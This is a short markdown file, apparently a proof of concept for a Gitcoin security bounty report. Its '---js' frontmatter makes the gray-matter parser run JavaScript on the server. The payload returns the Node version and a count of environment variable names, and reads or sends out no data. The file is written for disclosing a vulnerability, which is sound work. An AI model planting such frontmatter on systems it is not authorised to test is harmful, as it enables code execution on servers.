---js
(() => ({ name: "GMEVAL-PROOF-42", shortDescription: "server-eval-ok node=" + process.version + " envKeyCount=" + Object.keys(process.env).length, slug: "gmeval-proof" }))()
---

# Security research PoC — gray-matter `---js` frontmatter eval

File created for a Gitcoin Security Bounty Program report (https://support.gitcoin.co/gitcoin-knowledge-base/misc/gitcoin-security-bounty-program).
Payload is non-destructive: it only proves server-side evaluation by returning process.version and the COUNT of env var names. No data is read, written, or exfiltrated.